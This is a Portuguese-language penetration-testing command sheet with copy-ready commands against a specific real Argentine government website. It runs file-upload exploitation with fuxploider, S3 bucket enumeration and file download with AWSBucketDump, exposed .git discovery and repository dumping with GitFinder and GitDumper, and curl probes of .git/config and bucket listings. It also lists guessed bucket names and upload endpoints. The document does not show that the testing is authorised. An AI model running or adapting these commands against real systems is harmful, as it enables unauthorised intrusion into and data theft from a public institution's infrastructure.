# Comandos Manuais - Etapa 19: Vulnerabilidades Especializadas

## Comandos Prontos para Execução

### 1. Fuxploider - File Upload Testing

```bash
# Teste básico em endpoint WordPress
cd C:\Sec\Tools\fuxploider
python fuxploider.py -u https://desarrolloyempleo.cba.gov.ar/wp-admin/admin-ajax.php -vv

# Teste com regex personalizado
python fuxploider.py -u https://desarrolloyempleo.cba.gov.ar/wp-admin/admin-ajax.php -vv --true-regex ".*"

# Teste em endpoint de media upload
python fuxploider.py -u https://desarrolloyempleo.cba.gov.ar/wp-admin/async-upload.php -vv

# Teste em REST API media endpoint
python fuxploider.py -u https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/media -vv
```

### 2. AWSBucketDump - S3 Bucket Discovery

```bash
# Teste básico com wordlist
cd C:\Sec\Tools\AWSBucketDump
python AWSBucketDump.py -l ..\..\reports\etapa19_vulnerabilidades_especializadas\s3_bucket_names.txt -t 2

# Teste com download de arquivos (se buckets encontrados)
python AWSBucketDump.py -l ..\..\reports\etapa19_vulnerabilidades_especializadas\s3_bucket_names.txt -D -d 1 -t 2

# Teste com grep para palavras-chave interessantes
python AWSBucketDump.py -l ..\..\reports\etapa19_vulnerabilidades_especializadas\s3_bucket_names.txt -g interesting_Keywords.txt -t 2
```

### 3. GitFinder - Descoberta de Repositórios Git

```bash
# Criar arquivo com URLs para testar
cd C:\Sec\Tools\GitTools\Finder
echo "https://desarrolloyempleo.cba.gov.ar" > urls.txt
echo "https://desarrolloyempleo.cba.gov.ar/wp-content" >> urls.txt

# Executar GitFinder
python gitfinder.py -i urls.txt -o ..\..\reports\etapa19_vulnerabilidades_especializadas\gitfinder_results.txt -t 5
```

### 4. GitDumper - Git Repository Dump

```bash
# Teste básico - .git/ no root
cd C:\Sec\Tools\GitTools\Dumper
bash gitdumper.sh https://desarrolloyempleo.cba.gov.ar/.git/ ../../reports/etapa19_vulnerabilidades_especializadas/gitdumper_results/root/

# Teste em wp-content/.git/
bash gitdumper.sh https://desarrolloyempleo.cba.gov.ar/wp-content/.git/ ../../reports/etapa19_vulnerabilidades_especializadas/gitdumper_results/wp-content/

# Teste em wp-content/themes/.git/
bash gitdumper.sh https://desarrolloyempleo.cba.gov.ar/wp-content/themes/.git/ ../../reports/etapa19_vulnerabilidades_especializadas/gitdumper_results/themes/
```

### 5. Verificação Manual - Git Repository

```bash
# Verificar se .git/HEAD está acessível
curl -s https://desarrolloyempleo.cba.gov.ar/.git/HEAD

# Verificar .git/config
curl -s https://desarrolloyempleo.cba.gov.ar/.git/config

# Verificar .git/index
curl -s https://desarrolloyempleo.cba.gov.ar/.git/index

# Verificar se retorna 403 (protegido) ou 404 (não existe)
curl -I https://desarrolloyempleo.cba.gov.ar/.git/HEAD
```

### 6. Verificação Manual - File Upload Endpoints

```bash
# Verificar se endpoint de upload existe
curl -I https://desarrolloyempleo.cba.gov.ar/wp-admin/admin-ajax.php

# Verificar endpoint async-upload
curl -I https://desarrolloyempleo.cba.gov.ar/wp-admin/async-upload.php

# Verificar REST API media endpoint
curl -s https://desarrolloyempleo.cba.gov.ar/wp-json/wp/v2/media | head -20
```

### 7. Verificação Manual - S3 Buckets

```bash
# Testar bucket diretamente
curl -I https://desarrolloyempleo.s3.amazonaws.com/

# Testar bucket com região
curl -I https://desarrolloyempleo.s3.us-east-2.amazonaws.com/

# Verificar se bucket está listável
curl https://desarrolloyempleo.s3.amazonaws.com/
```

## Endpoints WordPress para Upload

Baseado na estrutura WordPress identificada:

1. **wp-admin/admin-ajax.php** - AJAX handler (pode processar uploads)
2. **wp-admin/async-upload.php** - Upload assíncrono WordPress
3. **wp-admin/media-upload.php** - Interface de upload de mídia
4. **wp-json/wp/v2/media** - REST API para upload de mídia
5. **wp-admin/upload.php** - Página de gerenciamento de uploads
6. **wp-content/uploads/** - Diretório onde arquivos são armazenados

## Nomes de Buckets S3 para Testar

Baseado no domínio e infraestrutura AWS identificada:

- `desarrolloyempleo`
- `desarrolloyempleo-cba`
- `desarrolloyempleo-cba-gov-ar`
- `cba-gov-ar`
- `mj-cba-gov-ar` (baseado no Cognito domain)
- Variações com sufixos: `-uploads`, `-media`, `-assets`, `-static`, `-backup`

## Endpoints .git para Testar

- `/.git/` - Root do site
- `/wp-content/.git/` - Diretório de conteúdo
- `/wp-content/themes/.git/` - Temas
- `/wp-content/plugins/.git/` - Plugins

## Observações Importantes

- ⚠️ **WordPress Upload:** WordPress geralmente requer autenticação para uploads
- ⚠️ **Git Repositories:** .git/ geralmente está protegido ou não existe em produção
- ⚠️ **S3 Buckets:** Buckets podem estar privados mas mal configurados
- ✅ **Infraestrutura AWS:** Uso de AWS aumenta probabilidade de S3 buckets
- ✅ **CloudFront:** CDN pode usar S3 como origem
